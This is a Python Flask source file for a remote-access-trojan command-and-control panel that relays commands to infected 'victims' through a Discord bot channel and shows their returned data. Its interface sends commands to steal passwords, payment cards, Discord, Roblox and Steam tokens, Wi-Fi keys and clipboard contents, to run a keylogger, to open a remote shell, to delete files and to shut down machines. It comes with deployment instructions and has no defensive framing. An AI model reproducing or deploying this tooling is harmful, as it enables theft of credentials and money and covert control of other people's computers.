# c2.py – Ultimate C2 Panel (professional, per‑victim tabs, logs)
# Deploy on Render with environment variables BOT_TOKEN, CHANNEL_ID

import os, time, json, threading, requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
if not BOT_TOKEN or not CHANNEL_ID:
    raise ValueError("Missing BOT_TOKEN or CHANNEL_ID")

DATA_FILE = "victims_data.json"
victims = {}
log_queues = {}
last_id = None

def load_data():
    global victims, log_queues
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                victims = data.get('victims', {})
                log_queues = data.get('log_queues', {})
                for vid in victims:
                    victims[vid]['last_seen'] = float(victims[vid]['last_seen'])
        except:
            pass

def save_data():
    data = {'victims': victims, 'log_queues': log_queues}
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def fetch_loop():
    global last_id, victims, log_queues
    while True:
        try:
            url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages?limit=50"
            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                msgs = resp.json()
                for msg in msgs:
                    mid = msg.get("id")
                    if last_id and mid == last_id:
                        break
                    content = msg.get("content", "")
                    if content.startswith("[") and "]" in content:
                        bracket = content.find("]")
                        victim_id = content[1:bracket]
                        rest = content[bracket+1:].strip()
                        if victim_id not in victims:
                            victims[victim_id] = {"last_seen": time.time(), "logs": []}
                        victims[victim_id]["last_seen"] = time.time()
                        if victim_id not in log_queues:
                            log_queues[victim_id] = []
                        log_queues[victim_id].append(rest)
                        if len(log_queues[victim_id]) > 200:
                            log_queues[victim_id] = log_queues[victim_id][-200:]
                        socketio.emit('new_log', {'victim': victim_id, 'log': rest})
                if msgs:
                    last_id = msgs[0]["id"]
        except:
            pass
        time.sleep(2)

threading.Thread(target=fetch_loop, daemon=True).start()

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/victims')
def api_victims():
    vlist = []
    for vid, data in victims.items():
        vlist.append({
            "id": vid,
            "last_seen": data["last_seen"],
            "online": (time.time() - data["last_seen"]) < 70
        })
    return jsonify(vlist)

@app.route('/api/logs/<victim_id>')
def api_logs(victim_id):
    return jsonify(log_queues.get(victim_id, []))

@app.route('/send', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get('victim')
    command = data.get('command')
    if not command:
        return jsonify({'success': False, 'error': 'No command'})
    final = f"{command} @{victim_id}" if victim_id else command
    url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    try:
        r = requests.post(url, headers=headers, json={"content": final}, timeout=10)
        if r.status_code == 200:
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': f"HTTP {r.status_code}"})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ultimate C2 Panel</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; font-family: 'Segoe UI', sans-serif; color: #eee; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { text-align: center; margin-bottom: 20px; color: #ff6b6b; font-size: 2rem; letter-spacing: -0.5px; }
        .victims-bar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; background: #15151f; padding: 12px; border-radius: 16px; }
        .victim-tab { background: #1e1e2a; border-radius: 40px; padding: 8px 18px; cursor: pointer; transition: 0.2s; border: 1px solid #2a2a3c; font-size: 14px; display: flex; align-items: center; gap: 8px; }
        .victim-tab.active { background: #ff6b6b; border-color: #ff6b6b; color: white; }
        .victim-tab.online { border-left: 4px solid #2ecc71; }
        .victim-tab.offline { opacity: 0.6; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
        .online .status-dot { background: #2ecc71; box-shadow: 0 0 4px #2ecc71; }
        .offline .status-dot { background: #e74c3c; }
        .main-panel { display: flex; gap: 20px; flex-wrap: wrap; }
        .controls { flex: 1; min-width: 280px; background: #15151f; border-radius: 20px; padding: 20px; }
        .log { flex: 2; min-width: 400px; background: #15151f; border-radius: 20px; padding: 20px; height: 65vh; overflow-y: auto; font-family: monospace; font-size: 13px; }
        .button-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
        button { background: #2a2a3c; border: none; color: white; padding: 8px 16px; border-radius: 30px; cursor: pointer; transition: 0.2s; font-size: 13px; }
        button:hover { background: #ff6b6b; transform: scale(1.02); }
        .cmd-row { display: flex; gap: 10px; margin: 15px 0; }
        .cmd-row input { flex: 1; background: #1e1e2a; border: 1px solid #3a3a4f; border-radius: 30px; padding: 8px 15px; color: white; outline: none; }
        .log p { margin: 6px 0; border-left: 2px solid #ff6b6b; padding-left: 12px; word-break: break-word; }
        .log pre { background: #0a0a12; padding: 8px; border-radius: 8px; overflow-x: auto; margin: 5px 0; }
        footer { text-align: center; margin-top: 30px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔥 ULTIMATE C2 PANEL</h1>
    <div class="victims-bar" id="victimsBar"></div>
    <div class="main-panel">
        <div class="controls">
            <div id="currentVictim" style="margin-bottom: 10px; font-weight: bold;">No victim selected</div>
            <div class="button-group">
                <button onclick="sendCmd('!info')">💻 Info</button>
                <button onclick="sendCmd('!ip')">🌐 IP</button>
                <button onclick="sendCmd('!clip')">📋 Clipboard</button>
                <button onclick="sendCmd('!active')">🪟 Active</button>
                <button onclick="sendCmd('!wifi')">📶 Wi-Fi</button>
                <button onclick="sendCmd('!tokens')">🎫 Discord</button>
                <button onclick="sendCmd('!passwords')">🔑 Passwords</button>
                <button onclick="sendCmd('!cards')">💳 Cards</button>
                <button onclick="sendCmd('!roblox')">🍪 Roblox</button>
                <button onclick="sendCmd('!steam')">🎮 Steam</button>
                <button onclick="sendCmd('!screenshot')">📸 Screenshot</button>
                <button onclick="sendCmd('!keylog_start')">⌨️ Keylog Start</button>
                <button onclick="sendCmd('!keylog_stop')">⏹️ Stop</button>
                <button onclick="sendCmd('!keylog_dump')">📄 Dump</button>
                <button onclick="sendCmd('!processes')">📊 Processes</button>
                <button onclick="sendCmd('!shell')">🐚 Shell Start</button>
                <button onclick="sendCmd('!shell_stop')">⏹️ Shell Stop</button>
                <button onclick="sendCmd('!lock')">🔒 Lock</button>
                <button onclick="sendCmd('!shutdown')">⏻ Shutdown</button>
                <button onclick="sendCmd('!restart')">⟳ Restart</button>
                <button onclick="sendCmd('!abort')">⚠️ Abort</button>
                <button onclick="sendCmd('!all')">⚠️ ALL DATA</button>
                <button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self‑Destruct</button>
                <button onclick="sendCmd('!exit')" style="background:#8b0000;">❌ Exit RAT</button>
            </div>
            <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir or !shell command"><button onclick="sendCustom()">▶️ Run</button></div>
            <div class="cmd-row"><input id="catPath" placeholder="!cat path"><button onclick="sendCmd('!cat '+catPath.value)">Read</button></div>
            <div class="cmd-row"><input id="rmPath" placeholder="!rm path"><button onclick="sendCmd('!rm '+rmPath.value)">Delete</button></div>
            <div class="cmd-row"><input id="lsPath" placeholder="!ls path (default C:\\)"><button onclick="sendCmd('!ls '+lsPath.value)">List</button></div>
        </div>
        <div class="log" id="logPanel"></div>
    </div>
    <footer>Commands sent via Discord bot. All results appear here.</footer>
</div>
<script>
    const socket = io();
    let currentVictim = null;
    let victims = {};

    socket.on('new_log', (data) => {
        if (data.victim === currentVictim) addLog(data.log);
        refreshVictims();
    });

    function refreshVictims() {
        fetch('/api/victims').then(r=>r.json()).then(data => {
            victims = {};
            const bar = document.getElementById('victimsBar');
            bar.innerHTML = '';
            data.forEach(v => {
                victims[v.id] = v;
                const tab = document.createElement('div');
                tab.className = `victim-tab ${v.online ? 'online' : 'offline'} ${currentVictim === v.id ? 'active' : ''}`;
                tab.innerHTML = `<span class="status-dot"></span> ${v.id}`;
                tab.onclick = () => selectVictim(v.id);
                bar.appendChild(tab);
            });
            if (currentVictim && victims[currentVictim]) {
                document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${currentVictim}`;
            } else if (data.length > 0 && !currentVictim) {
                selectVictim(data[0].id);
            } else if (!currentVictim) {
                document.getElementById('currentVictim').innerHTML = '⚠️ No victims online';
            }
        });
    }

    function selectVictim(victimId) {
        currentVictim = victimId;
        document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${victimId}`;
        fetch(`/api/logs/${victimId}`).then(r=>r.json()).then(logs => {
            const panel = document.getElementById('logPanel');
            panel.innerHTML = '';
            logs.forEach(log => addLog(log));
        });
        refreshVictims();
    }

    function addLog(msg) {
        const panel = document.getElementById('logPanel');
        const p = document.createElement('p');
        p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        panel.appendChild(p);
        p.scrollIntoView();
    }

    function sendCmd(cmd) {
        if (!currentVictim) { alert('Select a victim first'); return; }
        fetch('/send', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({victim: currentVictim, command: cmd})
        }).then(r=>r.json()).then(data => {
            if (data.success) addLog(`> ${cmd} (sent)`);
            else addLog(`❌ Failed: ${data.error}`);
        });
    }

    function sendCustom() {
        let cmd = document.getElementById('customCmd').value.trim();
        if (cmd) sendCmd(cmd);
        document.getElementById('customCmd').value = '';
    }

    setInterval(refreshVictims, 5000);
    refreshVictims();
</script>
</body>
</html>
"""

if __name__ == '__main__':
    load_data()
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
